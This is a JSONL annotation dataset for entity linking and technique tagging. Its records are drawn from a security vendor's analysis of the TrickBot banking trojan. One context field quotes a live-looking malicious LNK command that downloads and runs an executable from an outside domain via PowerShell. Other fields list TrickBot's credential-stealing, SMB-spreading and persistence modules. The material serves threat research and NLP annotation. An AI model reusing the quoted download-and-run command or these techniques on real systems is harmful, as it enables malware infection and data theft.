{"mention": "Zscaler", "context_left": "First observed in 2016, TrickBot is a successor of the banking trojan Dyre and has become one of the most prevalent and dangerous malware strains in today's threat landscape, which is constantly monitored by the [", "context_right": "ThreatLabZ team](/threatlabz/cloud-activity-dashboard).", "_context_left": "First observed in 2016, TrickBot is a successor of the banking trojan Dyre and has become one of the most prevalent and dangerous malware strains in today's threat landscape, which is constantly monitored by the [", "_context_right": " ThreatLabZ team](/threatlabz/cloud-activity-dashboard).", "sentence_left": "April 09, 2020", "sentence_right": "TrickBot is continually evolving as its developers add new features and tricks.", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "North Korean", "context_left": "(Notably, Ryuk was attributed to", "context_right": "actors based on code similarities with Hermes ransomware, but many researchers later argued that these similarities were not conclusive.", "_context_left": "(Notably, Ryuk was attributed to ", "_context_right": " actors based on code similarities with Hermes ransomware, but many researchers later argued that these similarities were not conclusive.", "sentence_left": "It is probably a specialized version reserved for certain targets or may be available to rent out to special customers, potentially nation-state actors.", "sentence_right": "Since almost every TrickBot infection starts with malspam containing an attached downloader or from a partner botnet like [Emotet](/blogs/research/emotet-back-action-after-short-break), we will take a look at those downloading TrickBot loaders over the last year.", "label": "North Korea (Korean: ; MR: \"Choson\" or literally ; MR: \"Pukchoson\"), officially the Democratic People's Republic of Korea (DPRK or DPR Korea; Korean: , \"Choson Minjujuui Inmin Konghwaguk\"), is a country in East Asia constituting the northern part of the Korean Peninsula, with Pyongyang the capital and the largest city in the country. To the north and northwest, the country is bordered by China and by Russia along the Amnok (known as the Yalu in Chinese) and Tumen rivers and to the south it is bordered by South Korea, with the heavily fortified Korean Demilitarized Zone (DMZ) separating the two. Nevertheless, North Korea, like its southern counterpart, claims to be the legitimate government of the entire peninsula and adjacent islands.  In 1910, Korea was annexed by Imperial Japan. After the Japanese surrender at the end of World War II in 1945, Korea was divided into two zones, with the north occupied by the Soviet Union and the south occupied by the United States. Negotiations on reunification failed, and in 1948, separate governments were formed: the socialist Democratic People's Republic of Korea in the north, and the capitalist Republic of Korea in the south. An invasion initiated by North Korea led to the Korean War (1950–1953). The Korean Armistice Agreement brought about a ceasefire, but no peace treaty was signed.  North Korea officially describes itself as a \"self-reliant\" socialist state, and formally holds elections, though said elections have been described by outside observers as sham elections. Outside observers also generally view North Korea as", "label_id": 10400, "label_title": "North Korea", "label_link": "https://en.wikipedia.org/wiki?curid=21255", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "U.S.", "context_left": "Image 10:", "context_right": "Employment template used by document downloaders", "_context_left": "Image 10: ", "_context_right": " Employment template used by document downloaders", "sentence_left": "![US Employement template used by document downloaders](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Trickbot%20Refresher/us_employement_template.png)", "sentence_right": "![JP Morgan template used by document downloaders](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Trickbot%20Refresher/xlsm_template.png)", "label": "The United States of America (USA), commonly known as the United States (U.S. or US) or America, is a country comprising 50 states, a federal district, five major self-governing territories, and various possessions. At , the United States is the world's third or fourth largest country by total area and is slightly smaller than the entire continent of Europe's . With a population of more than 327 million people, the U.S. is the third most populous country. Most of the country is located contiguously in North America between Canada and Mexico.  Paleo-Indians migrated from Siberia to the North American mainland at least 12,000 years ago. European colonization began in the 16th century. The United States emerged from the thirteen British colonies established along the East Coast. Following the French and Indian War, numerous disputes between Great Britain and the colonies led to the American Revolution, which began in 1775, and the subsequent Declaration of Independence in 1776. The war ended in 1783 with the United States becoming the first country to gain independence from a European power. The current constitution was adopted in 1788, with the first ten amendments, collectively named the Bill of Rights, being ratified in 1791 to guarantee many fundamental civil liberties. The United States expanded across North America throughout the 19th century until it spanned the continent by 1848. During the second half of the 19th century, the Civil War led to the abolition of slavery. The United States emerged from as a global superpower and a permanent member of the", "label_id": 783851, "label_title": "United States", "label_link": "https://en.wikipedia.org/wiki?curid=3434750", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "Microsoft", "context_left": "* outlookDll - For stealing data saved by", "context_right": "Outlook", "_context_left": "* outlookDll - For stealing data saved by ", "_context_right": " Outlook", "sentence_left": "* tabDll - For spreading over SMB using EternalRomance and MS17-010", "sentence_right": "* domainDll - For LDAP harvesting of domain controller configuration", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "Italy", "context_left": "Recently, around the second week-end of March, TrickBot added a few new banks from", "context_right": "to its target list, which includes:", "_context_left": "Recently, around the second week-end of March, TrickBot added a few new banks from ", "_context_right": " to its target list, which includes:", "sentence_left": "Image 21: Trickbot webinject configuration", "sentence_right": "| cedacri.it | banking4you.it | www.credem.it | nowbanking.credit-agricole.it |", "label": "Italy ( ), officially the Italian Republic ( ), is a European country consisting of a peninsula delimited by the Italian Alps and surrounded by several islands. Located in the middle of the Mediterranean sea and traversed along its length by the Apennines, Italy has a largely temperate seasonal and Mediterranean climate. The country covers an area of and shares open land borders with France, Slovenia, Austria, Switzerland and the enclaved microstates of Vatican City and San Marino. Italy has a territorial exclave in Switzerland (Campione) and a maritime exclave in the Tunisian Sea (Lampedusa). With around 60 million inhabitants, Italy is the fourth-most populous member state of the European Union.  Due to its central geographic location in Southern Europe and the Mediterranean, Italy has historically been home to myriad peoples and cultures. In addition to the various ancient peoples dispersed throughout modern-day Italy, the most predominant being the Indo-European Italic peoples who gave the peninsula its name, beginning from the classical era, Phoenicians and Carthaginians founded colonies mostly in insular Italy, Greeks established settlements in the so-called \"Magna Graecia\" of southern Italy, while Etruscans and Celts inhabited central and northern Italy respectively. An Italic tribe known as the Latins formed the Roman Kingdom in the 8th century BC, which eventually became a republic with a government of the Senate and the People. The Roman Republic initially conquered and assimilated its neighbours on the peninsula, eventually expanding and conquering parts of Europe, North Africa and Asia. By the first century BC, the Roman Empire", "label_id": 6937, "label_title": "Italy", "label_link": "https://en.wikipedia.org/wiki?curid=14532", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "Germany", "context_left": "And, most recently, TrickBot was observed using Android malware to bypass two-factor authentication in", "context_right": ".", "_context_left": "And, most recently, TrickBot was observed using Android malware to bypass two-factor authentication in ", "_context_right": ".", "sentence_left": "TrickBot recently introduced a new module called [rdpScanDll](https://labs.bitdefender.com/2020/03/new-trickbot-module-bruteforces-rdp-connections-targets-select-telecommunication-services-in-us-and-hong-kong/).", "sentence_right": "We have not seen the use of this app for other targets, but we don’t expect it to be long until attackers begin to use it worldwide.", "label": "Germany (, ), officially the Federal Republic of Germany (, ), is a country in Central and Western Europe, lying between the Baltic and North Seas to the north and the Alps, Lake Constance and the High Rhine to the south. It borders Denmark to the north, Poland and the Czech Republic to the east, Austria and Switzerland to the south, France to the southwest, and Luxembourg, Belgium and the Netherlands to the west.  Germany includes 16 constituent states, covers an area of , and has a largely temperate seasonal climate. With 83 million inhabitants, it is the second most populous state of Europe after Russia, the most populous state lying entirely in Europe, as well as the most populous member state of the European Union. Germany is a very decentralised country. Its capital and largest metropolis is Berlin, while Frankfurt serves as its financial capital and has the country's busiest airport. Germany's largest urban area is the Ruhr, with its main centres of Dortmund and Essen. The country's other major cities are Hamburg, Munich, Cologne, Stuttgart, Dusseldorf, Leipzig, Bremen, Dresden, Hanover, and Nuremberg.  Various Germanic tribes have inhabited the northern parts of modern Germany since classical antiquity. A region named Germania was documented before AD 100. During the Migration Period, the Germanic tribes expanded southward. Beginning in the 10th century, German territories formed a central part of the Holy Roman Empire. During the 16th century, northern German regions became the centre of the Protestant Reformation. After the collapse of the Holy Roman", "label_id": 5640, "label_title": "Germany", "label_link": "https://en.wikipedia.org/wiki?curid=11867", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "Zscaler", "context_left": "The", "context_right": "ThreatLabZ team proactively tracks and ensures coverage to block downloaders, payloads, webinjects, and C&C activity from TrickBot and related malware.", "_context_left": "The ", "_context_right": " ThreatLabZ team proactively tracks and ensures coverage to block downloaders, payloads, webinjects, and C&C activity from TrickBot and related malware.", "sentence_left": "We have not seen the use of this app for other targets, but we don’t expect it to be long until attackers begin to use it worldwide.", "sentence_right": "Because TrickBot’s C&C communications occur over SSL, we strongly recommend the use of SSL inspection to detect and block TrickBot and similar threats.", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "* networkDll - For gathering system information and network/domain topology", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* sharedll - For transferring over to ADMIN shares and creating persistence via services", "sentence_right": "* NewBCtestDll - Backconnect SOCK5 module", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "It may seem that each version represents two botnets that are run independently, but according to our data, the C&C infrastructure is shared by all versions.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Image 16: TrickBot loader version and compilation date timeline", "sentence_right": "More than 1,400 C&C IPs extracted from the TrickBot configuration were used to draw a relationship map with loader versions.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "These LNK files contain batch commands to extract and run downloader VBS code.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*/C set o=HttPs:/&powershEll \"$sd=new-object system.nEt.weBcliEnt;$sd.doWnloAdfIle($env:o+'/www.braintrainersuk.com/ONOLTDA-GD.exe',$env:tmp+'\\D.exe');\"&\"%programfiles%\\wiNDows nt\\accESsorIes\\wORdpaD\" c:\\pagefIle.syS&%tmp%/d&J34HH&E34JSH\\_d+&df*", "sentence_right": "For example:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "We have seen LNK files with the following icons.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "TrickBot is often spread using spam emails with attached ZIP files containing LNK (.lnk) files.", "sentence_right": "![LNK File icons observed in the wild](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Trickbot%20Refresher/lnk_file_icons.png)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "![Code using chr obfuscation](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Trickbot%20Refresher/chr_replace.png)", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "In this script we mainly observed two types of obfuscation; one is where the obfuscated string is provided and it executes, replacing a part of it with “)+chr(“", "sentence_right": "Image 2: Code using CHR obfuscation", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "* sharedll - For transferring over to ADMIN shares and creating persistence via services", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* mailsearcher - For traversal over all files in all drives in the system to steal", "sentence_right": "* networkDll - For gathering system information and network/domain topology", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}
{"mention": "* LNK", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "We have primarily seen three types of non-executable downloaders:", "sentence_right": "* JS", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-04-09_trickbot-emerges-few-new-tricks"}